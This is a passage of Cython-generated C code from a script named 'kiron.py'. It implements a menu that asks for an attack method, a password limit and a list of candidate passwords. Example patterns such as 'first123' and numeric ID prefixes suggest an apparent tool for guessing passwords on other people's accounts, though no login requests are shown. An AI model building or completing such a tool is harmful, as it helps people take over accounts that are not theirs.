        PyTuple_SET_ITEM(__pyx_t_4, 8, __pyx_kp_u_M2_38_5_244m);
        __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_4, 9, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 273, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":274
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M1\x1b[38;5;244m]\n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M2\x1b[38;5;244m]');linex()
 *                                 mthd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')             # <<<<<<<<<<<<<<
 *                                 try:
 *                                     clear()
 */
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 274, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 274, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 274, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
        __pyx_t_8 += 33;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
        __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 274, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 274, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_v_mthd = __pyx_t_4;
        __pyx_t_4 = 0;

        /* "kiron.py":275
 *                                 print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M1\x1b[38;5;244m]\n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M2\x1b[38;5;244m]');linex()
 *                                 mthd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                     clear()
 *                                     ps_limit = int(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD LIMIT : '))
 */
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_13, &__pyx_t_12);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_12);
          /*try:*/ {

            /* "kiron.py":276
 *                                 mthd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 try:
 *                                     clear()             # <<<<<<<<<<<<<<
 *                                     ps_limit = int(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD LIMIT : '))
 *                                 except:
 */
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_clear); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 276, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_6 = NULL;
            __pyx_t_7 = 0;
            #if CYTHON_UNPACK_METHODS
            if (unlikely(PyMethod_Check(__pyx_t_5))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
                __pyx_t_7 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 276, __pyx_L20_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "kiron.py":277
 *                                 try:
 *                                     clear()
 *                                     ps_limit = int(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD LIMIT : '))             # <<<<<<<<<<<<<<
 *                                 except:
 *                                     ps_limit =1
 */
            __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 277, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_8 = 0;
            __pyx_t_9 = 127;
            __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
            __pyx_t_8 += 12;
            __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
            PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 277, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 277, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
            __Pyx_GIVEREF(__pyx_t_6);
            PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_6);
            __pyx_t_6 = 0;
            __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_LIM);
            __pyx_t_8 += 41;
            __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_LIM);
            PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_LIM);
            __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 277, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 277, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 277, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_v_ps_limit = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "kiron.py":275
 *                                 print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M1\x1b[38;5;244m]\n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M2\x1b[38;5;244m]');linex()
 *                                 mthd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                     clear()
 *                                     ps_limit = int(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD LIMIT : '))
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          goto __pyx_L25_try_end;
          __pyx_L20_error:;
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

          /* "kiron.py":278
 *                                     clear()
 *                                     ps_limit = int(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD LIMIT : '))
 *                                 except:             # <<<<<<<<<<<<<<
 *                                     ps_limit =1
 *                                 clear()
 */
          /*except:*/ {
            __Pyx_AddTraceback("kiron.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_4, &__pyx_t_5) < 0) __PYX_ERR(0, 278, __pyx_L22_except_error)
            __Pyx_XGOTREF(__pyx_t_6);
            __Pyx_XGOTREF(__pyx_t_4);
            __Pyx_XGOTREF(__pyx_t_5);

            /* "kiron.py":279
 *                                     ps_limit = int(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD LIMIT : '))
 *                                 except:
 *                                     ps_limit =1             # <<<<<<<<<<<<<<
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 */
            __Pyx_INCREF(__pyx_int_1);
            __Pyx_XDECREF_SET(__pyx_v_ps_limit, __pyx_int_1);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            goto __pyx_L21_exception_handled;
          }

          /* "kiron.py":275
 *                                 print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M1\x1b[38;5;244m]\n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M2\x1b[38;5;244m]');linex()
 *                                 mthd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                     clear()
 *                                     ps_limit = int(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD LIMIT : '))
 */
          __pyx_L22_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_12);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_13, __pyx_t_12);
          goto __pyx_L3_error;
          __pyx_L21_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_12);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_13, __pyx_t_12);
          __pyx_L25_try_end:;
        }

        /* "kiron.py":280
 *                                 except:
 *                                     ps_limit =1
 *                                 clear()             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_clear); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 280, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 280, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "kiron.py":281
 *                                     ps_limit =1
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 *                                 for i in range(ps_limit):
 */
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "kiron.py":282
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()             # <<<<<<<<<<<<<<
 *                                 for i in range(ps_limit):
 *                                     plist.append(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m\x1b[38;5;46m{A} '))
 */
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__35, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 282, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "kiron.py":283
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 *                                 for i in range(ps_limit):             # <<<<<<<<<<<<<<
 *                                     plist.append(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m\x1b[38;5;46m{A} '))
 *                                 linex()
 */
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_ps_limit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 283, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (likely(PyList_CheckExact(__pyx_t_5)) || PyTuple_CheckExact(__pyx_t_5)) {
          __pyx_t_4 = __pyx_t_5; __Pyx_INCREF(__pyx_t_4);
          __pyx_t_8 = 0;
          __pyx_t_18 = NULL;
        } else {
          __pyx_t_8 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 283, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_18 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 283, __pyx_L3_error)
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        for (;;) {
          if (likely(!__pyx_t_18)) {
            if (likely(PyList_CheckExact(__pyx_t_4))) {
              {
                Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_4);
                #if !CYTHON_ASSUME_SAFE_MACROS
                if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 283, __pyx_L3_error)
                #endif
                if (__pyx_t_8 >= __pyx_temp) break;
              }
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_5 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 283, __pyx_L3_error)
              #else
              __pyx_t_5 = __Pyx_PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 283, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_5);
              #endif
            } else {
              {
                Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_4);
                #if !CYTHON_ASSUME_SAFE_MACROS
                if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 283, __pyx_L3_error)
                #endif
                if (__pyx_t_8 >= __pyx_temp) break;
              }
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 283, __pyx_L3_error)
              #else
              __pyx_t_5 = __Pyx_PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 283, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_5);
              #endif
            }
          } else {
            __pyx_t_5 = __pyx_t_18(__pyx_t_4);
            if (unlikely(!__pyx_t_5)) {
              PyObject* exc_type = PyErr_Occurred();
              if (exc_type) {
                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                else __PYX_ERR(0, 283, __pyx_L3_error)
              }
              break;
            }
            __Pyx_GOTREF(__pyx_t_5);
          }
          __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_5);
          __pyx_t_5 = 0;

          /* "kiron.py":284
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 *                                 for i in range(ps_limit):
 *                                     plist.append(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m\x1b[38;5;46m{A} '))             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_plist); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_6 = PyTuple_New(7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_19 = 0;
          __pyx_t_9 = 127;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
          __pyx_t_19 += 12;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
          PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_38_5_244m_2);
          __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_A); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_t_15, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) : __pyx_t_9;
          __pyx_t_19 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_16);
          __Pyx_GIVEREF(__pyx_t_16);
          PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_16);
          __pyx_t_16 = 0;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_NO);
          __pyx_t_19 += 36;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_NO);
          PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_NO);
          __pyx_t_16 = __Pyx_PyInt_AddObjC(__pyx_v_i, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_t_16, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_9;
          __pyx_t_19 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
          __Pyx_GIVEREF(__pyx_t_15);
          PyTuple_SET_ITEM(__pyx_t_6, 3, __pyx_t_15);
          __pyx_t_15 = 0;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_4);
          __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
          __pyx_t_19 += 23;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_4);
          PyTuple_SET_ITEM(__pyx_t_6, 4, __pyx_kp_u_38_5_244m_38_5_46m_4);
          __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_A); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_t_15, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) : __pyx_t_9;
          __pyx_t_19 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_16);
          __Pyx_GIVEREF(__pyx_t_16);
          PyTuple_SET_ITEM(__pyx_t_6, 5, __pyx_t_16);
          __pyx_t_16 = 0;
          __Pyx_INCREF(__pyx_kp_u__25);
          __pyx_t_19 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__25);
          PyTuple_SET_ITEM(__pyx_t_6, 6, __pyx_kp_u__25);
          __pyx_t_16 = __Pyx_PyUnicode_Join(__pyx_t_6, 7, __pyx_t_19, __pyx_t_9); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_16); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
